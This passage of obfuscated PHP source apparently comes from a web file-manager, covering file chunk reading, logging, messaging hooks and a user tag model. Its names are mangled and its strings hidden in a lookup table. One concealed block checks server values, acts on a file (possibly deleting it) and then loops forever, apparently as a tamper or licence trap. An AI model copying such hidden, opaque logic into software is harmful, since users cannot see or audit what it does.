$“°±Š±  + strlen($Õè˜Ò); if ($×ğÜ™Ôã >= $ªùÁô†Ü) { continue; } if ($×ğÜ™Ôã >= $“°±Š±  && $×ğÜ™Ôã + $Š×õÚ½æ <= $ªùÁô†Ü) { return substr($Õè˜Ò, $×ğÜ™Ôã - $“°±Š± , $Š×õÚ½æ); } break; } if (count($Ë€©¼â˜) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Õ„êÃ‰[1648], $Õ„êÃ‰[1649] . count($Ë€©¼â˜) . "\73\163\164\141\162\164\75{$×ğÜ™Ôã}\54\154\x65\x6e\147\164\x68\75{$Š×õÚ½æ}\73\160\x6f\x73\145\x3a{$“°±Š± }\176{$ªùÁô†Ü}"); throw new Exception($Õ„êÃ‰[1650]); } $«ß‚ã“õ = intval($×ğÜ™Ôã / $Ç­æË¥ú) * $Ç­æË¥ú; $İ Ú•¸ = ceil(($×ğÜ™Ôã + $Š×õÚ½æ) / $Ç­æË¥ú) * $Ç­æË¥ú - $«ß‚ã“õ; $à©ïãø• = IO::fileSubstr($this->path, $«ß‚ã“õ, $İ Ú•¸); $Ë€©¼â˜[$«ß‚ã“õ . $Õ„êÃ‰[12]] = $à©ïãø•; ksort($Ë€©¼â˜); $É‚îø”î = substr($à©ïãø•, $×ğÜ™Ôã - $«ß‚ã“õ, $Š×õÚ½æ); return $É‚îø”î; } private function log($ò ß—ğ, $‘äÍˆ…¥) { $ĞÌü½µõ =& $_SERVER[¯‘·½]; $« ÄàÎî = timeFloat() - $this->timeStart; write_log(sprintf($ĞÌü½µõ[1651], $ò ß—ğ, $this->info[$ĞÌü½µõ[32]], $« ÄàÎî, $‘äÍˆ…¥), $ĞÌü½µõ[1288]); } } if (!isset($_SERVER[$_SERVER[¯‘·½][969]]) || !isset($_SERVER[$_SERVER[¯‘·½][1247]])) { $_getc = $_SERVER[¯‘·½][972]; $_getfile = $_SERVER[$_SERVER[¯‘·½][973]] . $_SERVER[¯‘·½][974]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯‘·½][288], $_getfilec); if (count($_getarrs) < $_SERVER[¯‘·½][701]) { $exit = $_SERVER[¯‘·½][975]; $exit(); } $_act = $_SERVER[¯‘·½][1246]; $_act($_SERVER[$_SERVER[¯‘·½][973]] . $_SERVER[¯‘·½][974]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¯‘·½][456]); } } class Message { function __construct() { } public function send($»íÙ×ÕÃ = '', $½«ë§í = array(), $Ò²ü¥• = "\164\145\170\164") { $ÅÖµ¶­è =& $_SERVER[¯‘·½]; $ÎùòëÕˆ = array($ÅÖµ¶­è[33] => $ÅÖµ¶­è[1232], $ÅÖµ¶­è[171] => $»íÙ×ÕÃ); if (in_array($Ò²ü¥•, array($ÅÖµ¶­è[1232], $ÅÖµ¶­è[1652]))) { $ÎùòëÕˆ[$ÅÖµ¶­è[33]] = $Ò²ü¥•; } $½«ë§í = array($ÅÖµ¶­è[582] => isset($½«ë§í[$ÅÖµ¶­è[582]]) ? $½«ë§í[$ÅÖµ¶­è[582]] : $ÅÖµ¶­è[12], $ÅÖµ¶­è[669] => isset($½«ë§í[$ÅÖµ¶­è[669]]) ? $½«ë§í[$ÅÖµ¶­è[669]] : $ÅÖµ¶­è[12]); if (empty($»íÙ×ÕÃ) || empty($½«ë§í[$ÅÖµ¶­è[582]]) && empty($½«ë§í[$ÅÖµ¶­è[669]])) { return !1; } $É–·€¦ = array($ÅÖµ¶­è[1581] => $ÎùòëÕˆ, $ÅÖµ¶­è[1653] => $½«ë§í); Hook::trigger($ÅÖµ¶­è[1654], $É–·€¦); } } goto F÷™ùÃ¤Ø­; dˆƒ‰êïİ£: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($º×œà§) { $ÜËŠê =& $_SERVER[¯‘·½]; return array($ÜËŠê[2122] => array($ÜËŠê[2556] . USER_ID, $ÜËŠê[2123])); } protected function listData() { $ÕüÓ»™ =& $_SERVER[¯‘·½]; $¥±ÛÈ´¹ = array($ÕüÓ»™[1797] => USER_ID, $ÕüÓ»™[561] => array($ÕüÓ»™[2126], 0)); $€õ§ÁÍ… = $ÕüÓ»™[2557]; $“–Ø‡ÒÚ = $this->field($€õ§ÁÍ…)->where($¥±ÛÈ´¹)->order($ÕüÓ»™[2128])->select(); return $“–Ø‡ÒÚ ? $“–Ø‡ÒÚ : array(); } protected function addToTag($ñºËåª, $ûÓ³‡ÙÓ) { $ƒ¯ƒŠÌ =& $_SERVER[¯‘·½]; if (!Model($ƒ¯ƒŠÌ[2279])->listData($ûÓ³‡ÙÓ)) { return !1; } if (is_numeric($ñºËåª)) { $½ßíûÉ³ = Model($ƒ¯ƒŠÌ[916])->pathInfo($ñºËåª); if (!$½ßíûÉ³) { return !1; } } else { $½ßíûÉ³ = IO::infoSimple($ñºËåª); if (!$½ßíûÉ³) { return !1; } $Ù²ªûí = $½ßíûÉ³[$ƒ¯ƒŠÌ[32]]; $ü­Ôæóğ = $½ßíûÉ³[$ƒ¯ƒŠÌ[33]]; if (isset($½ßíûÉ³[$ƒ¯ƒŠÌ[487]])) { $ü­Ôæóğ = $½ßíûÉ³[$ƒ¯ƒŠÌ[487]] == $ƒ¯ƒŠÌ[91] ? $ƒ¯ƒŠÌ[78] : $ƒ¯ƒŠÌ[233]; } } $ØûÉƒ¹ = array($ƒ¯ƒŠÌ[1797] => USER_ID, $ƒ¯ƒŠÌ[561] => $ûÓ³‡ÙÓ, $ƒ¯ƒŠÌ[497] => $ñºËåª, $ƒ¯ƒŠÌ[498] => $ü­Ôæóğ ? $ü­Ôæóğ : $ƒ¯ƒŠÌ[492], $ƒ¯ƒŠÌ[496] => $Ù²ªûí ? $Ù²ªûí : $ƒ¯ƒŠÌ[12], $ƒ¯ƒŠÌ[2010] => 0); if ($this->where($ØûÉƒ¹)->find()) { return !1; } return $this->add($ØûÉƒ¹); } protected function removeFromTag($™×‘Ïş, $ä°î–´Ø) { $¿¹¾¶†Â =& $_SERVER[¯‘·½]; if (!Model($¿¹¾¶†Â[2279])->listData($ä°î–´Ø)) { return !1; } if (is_array($™×‘Ïş)) { $™×‘Ïş = array($¿¹¾¶†Â[7], $™×‘Ïş); } $à›õÌ„š = array($¿¹¾¶†Â[1797] => USER_ID, $¿¹¾¶†Â[561] => $ä°î–´Ø, $¿¹¾¶†Â[497] => $™×‘Ïş); return $this->where($à›õÌ„š)->delete(); } protected function removeByTag($¡Ş„ğ) { $õš¢‘åÆ =& $_SERVER[¯‘·½]; if (!$¡Ş„ğ) { return !1; } $›É¯Ò·» = array($õš¢‘åÆ[1797] => USER_ID, $õš¢‘åÆ[561] => $¡Ş„ğ); return $this->where($›É¯Ò·»)->delete(); } protected function removeBySource($•à„©Ñ) { $¡Ï‹ÕÖ¨ =& $_SERVER[¯‘·½]; if (is_array($•à„©Ñ)) { $•à„©Ñ = array($¡Ï‹ÕÖ¨[7], $•à„©Ñ); } $ÅııÉÔ» = array($¡Ï‹ÕÖ¨[1797] => USER_ID, $¡Ï‹ÕÖ¨[561] => array($¡Ï‹ÕÖ¨[1110], 0), $¡Ï‹ÕÖ¨[497] => $•à„©Ñ); return $this->where($ÅııÉÔ»)->delete(); } }